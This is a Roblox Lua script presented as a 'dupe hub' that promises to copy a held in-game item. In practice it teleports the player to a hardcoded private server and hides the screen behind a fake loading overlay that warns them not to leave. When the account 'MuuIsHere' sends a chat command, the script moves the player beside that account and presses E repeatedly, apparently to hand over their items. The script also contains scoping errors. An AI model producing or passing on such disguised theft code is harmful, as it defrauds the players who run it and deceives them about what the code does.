-- Muu Dupe Hub - FINAL VERSION (Solid Background, Auto TP to PS after 15s, 2nd Loading on Rejoin, !start/!finish)
-- 1. First loading: 15 seconds → 100% → auto TP to your private server
-- 2. On rejoin → 2nd loading (4 minutes) starts automatically
-- 3. After 2nd loading → wait for MuuIsHere !finish [yourname] → TP to public + stop script
-- 4. !start [yourname] → TP to MuuIsHere + hold E 3s × 10 times
-- Solid dark blue, big red warning, text fits buttons, chunky GUI

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")
local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")

local muu = Players:FindFirstChild("MuuIsHere")
local isDuping = false
local overlayGui = nil
local loadingBar = nil
local privateServerCode = "635978a3a09faf4485078c4caba3eda2"  -- Your PS code

-- Create main GUI (chunky)
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MuuDupeHub"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 380, 0, 480)
frame.Position = UDim2.new(0.5, -190, 0.5, -240)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 40)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 20)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 70)
title.BackgroundTransparency = 1
title.Text = "Muu Dupe Hub"
title.TextColor3 = Color3.fromRGB(100, 200, 255)
title.Font = Enum.Font.GothamBlack
title.TextSize = 45
title.Parent = frame

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(0.9, 0, 0, 80)
statusLabel.Position = UDim2.new(0.05, 0, 0.15, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Hold brainrot that you want to dupe"
statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
statusLabel.Font = Enum.Font.GothamBold
statusLabel.TextSize = 24
statusLabel.TextWrapped = true
statusLabel.Parent = frame

local dot = Instance.new("Frame")
dot.Size = UDim2.new(0, 30, 0, 30)
dot.Position = UDim2.new(0.05, 0, 0.28, 0)
dot.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
dot.BorderSizePixel = 0
dot.Parent = frame
local dotCorner = Instance.new("UICorner")
dotCorner.CornerRadius = UDim.new(1, 0)
dotCorner.Parent = dot

local dupeButton = Instance.new("TextButton")
dupeButton.Size = UDim2.new(0.8, 0, 0, 90)
dupeButton.Position = UDim2.new(0.1, 0, 0.45, 0)
dupeButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
dupeButton.Text = "DUPE"
dupeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
dupeButton.Font = Enum.Font.GothamBlack
dupeButton.TextSize = 38
dupeButton.Parent = frame
local dupeCorner = Instance.new("UICorner")
dupeCorner.CornerRadius = UDim.new(0, 16)
dupeCorner.Parent = dupeButton

-- Overlay (SOLID dark blue)
local function createOverlay(isSecond)
    overlayGui = Instance.new("ScreenGui")
    overlayGui.Name = "DupeOverlay"
    overlayGui.IgnoreGuiInset = true
    overlayGui.Parent = playerGui

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 50)  -- Solid dark blue
    bg.BackgroundTransparency = 0
    bg.Parent = overlayGui

    local shade = Instance.new("Frame")
    shade.Size = UDim2.new(0.65, 0, 0.45, 0)
    shade.Position = UDim2.new(0.175, 0, 0.275, 0)
    shade.BackgroundColor3 = Color3.fromRGB(10, 10, 40)
    shade.BackgroundTransparency = 0.3
    shade.Parent = overlayGui
    local shadeCorner = Instance.new("UICorner")
    shadeCorner.CornerRadius = UDim.new(0, 20)
    shadeCorner.Parent = shade

    local hubText = Instance.new("TextLabel")
    hubText.Size = UDim2.new(1, 0, 0.35, 0)
    hubText.Position = UDim2.new(0, 0, 0.08, 0)
    hubText.BackgroundTransparency = 1
    hubText.Text = "Muu Dupe Hub"
    hubText.TextColor3 = Color3.fromRGB(100, 200, 255)
    hubText.Font = Enum.Font.GothamBlack
    hubText.TextSize = 70
    hubText.Parent = shade

    local rejoinText = Instance.new("TextLabel")
    rejoinText.Size = UDim2.new(1, 0, 0.3, 0)
    rejoinText.Position = UDim2.new(0, 0, 0.43, 0)
    rejoinText.BackgroundTransparency = 1
    rejoinText.Text = isSecond and "Duping..." or "We are rejoining you since it is part of the dupe..."
    rejoinText.TextColor3 = Color3.fromRGB(200, 200, 255)
    rejoinText.Font = Enum.Font.Gotham
    rejoinText.TextSize = 28
    rejoinText.TextWrapped = true
    rejoinText.Parent = shade

    -- Big red warning
    local warningText = Instance.new("TextLabel")
    warningText.Size = UDim2.new(1, 0, 0.15, 0)
    warningText.Position = UDim2.new(0, 0, 0.73, 0)
    warningText.BackgroundTransparency = 1
    warningText.Text = "DO NOT LEAVE OR YOUR BRAINROT COULD GET DELETED"
    warningText.TextColor3 = Color3.fromRGB(255, 0, 0)
    warningText.Font = Enum.Font.GothamBlack
    warningText.TextSize = 32
    warningText.TextWrapped = true
    warningText.Parent = shade

    -- Loading bar (chunky)
    local barFrame = Instance.new("Frame")
    barFrame.Size = UDim2.new(0.85, 0, 0, 50)
    barFrame.Position = UDim2.new(0.075, 0, 0.88, 0)
    barFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 80)
    barFrame.Parent = shade
    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(0, 12)
    barCorner.Parent = barFrame

    loadingBar = Instance.new("Frame")
    loadingBar.Size = UDim2.new(0, 0, 1, 0)
    loadingBar.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
    loadingBar.Parent = barFrame
    local loadingCorner = Instance.new("UICorner")
    loadingCorner.CornerRadius = UDim.new(0, 12)
    loadingCorner.Parent = loadingBar

    local barLabel = Instance.new("TextLabel")
    barLabel.Size = UDim2.new(1, 0, 1, 0)
    barLabel.BackgroundTransparency = 1
    barLabel.Text = "Duping brainrot... 0%"
    barLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    barLabel.Font = Enum.Font.GothamBold
    barLabel.TextSize = 32
    barLabel.Parent = barFrame
end

-- Status update (hold check)
RunService.Heartbeat:Connect(function()
    local char = localPlayer.Character
    if char and char:FindFirstChildOfClass("Tool") then
        statusLabel.Text = "Ready"
        dot.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        dupeButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
        dupeButton.Text = "DUPE"
    else
        statusLabel.Text = "Hold a brainrot"
        dot.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        dupeButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
        dupeButton.Text = "Hold brainrot first"
    end
end)

-- Dupe button click
dupeButton.MouseButton1Click:Connect(function()
    local char = localPlayer.Character
    if not char or not char:FindFirstChildOfClass("Tool") then return end
    
    isDuping = true
    dupeButton.Text = "DUPING..."
    dupeButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    
    createOverlay(false)  -- First loading
    
    -- Mute audio
    for _, sound in pairs(game:GetService("Workspace"):GetDescendants()) do
        if sound:IsA("Sound") then
            sound.Playing = false
        end
    end
    
    -- First loading bar (15 seconds)
    local tweenInfo = TweenInfo.new(15, Enum.EasingStyle.Linear)
    local tween = TweenService:Create(loadingBar, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
    tween:Play()
    
    local elapsed = 0
    local connection = RunService.Heartbeat:Connect(function(dt)
        elapsed = elapsed + dt
        barLabel.Text = "Duping brainrot... " .. math.floor((elapsed / 15) * 100) .. "%"
        if elapsed >= 15 then
            connection:Disconnect()
            barLabel.Text = "Duping brainrot... 100% - Joining Private Server"
            -- Auto TP to private server
            TeleportService:TeleportToPrivateServer(game.PlaceId, privateServerCode, {localPlayer})
        end
    end)
end)

-- Chat commands from MuuIsHere
if muu then
    muu.Chatted:Connect(function(msg)
        local args = msg:split(" ")
        if args[1] == "!finish" and args[2] == localPlayer.Name then
            -- TP to public server
            TeleportService:Teleport(game.PlaceId, localPlayer)
            -- Stop script
            screenGui:Destroy()
            if overlayGui then overlayGui:Destroy() end
        elseif args[1] == "!start" and args[2] == localPlayer.Name then
            -- TP to MuuIsHere
            local muuChar = muu.Character
            if muuChar and muuChar:FindFirstChild("HumanoidRootPart") then
                localPlayer.Character.HumanoidRootPart.CFrame = muuChar.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
            end
            
            -- Hold E for 3 seconds × 10 times
            task.spawn(function()
                for i = 1, 10 do
                    keypress(0x45)  -- E key
                    task.wait(3)    -- Hold for 3 seconds
                    keyrelease(0x45)
                    task.wait(0.5)  -- Pause between holds
                end
                print("Finished holding E 10 times!")
            end)
        end
    end)
end

-- On rejoin → show second loading screen
localPlayer.CharacterAdded:Connect(function()
    if isDuping then
        isSecondLoading = true
        createOverlay(true)  -- Second loading
        barLabel.Text = "Duping brainrot... 0%"
        
        -- Second loading bar (4 minutes)
        local tweenInfo = TweenInfo.new(240, Enum.EasingStyle.Linear)
        local tween = TweenService:Create(loadingBar, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
        tween:Play()
        
        local elapsed = 0
        local connection = RunService.Heartbeat:Connect(function(dt)
            elapsed = elapsed + dt
            barLabel.Text = "Duping brainrot... " .. math.floor((elapsed / 240) * 100) .. "%"
            if elapsed >= 240 then
                connection:Disconnect()
                barLabel.Text = "Duping brainrot... 100% - Waiting for MuuIsHere !finish"
            end
        end)
    end
end)

print("Muu Dupe Hub Loaded! Hold brainrot, click DUPE to start.")
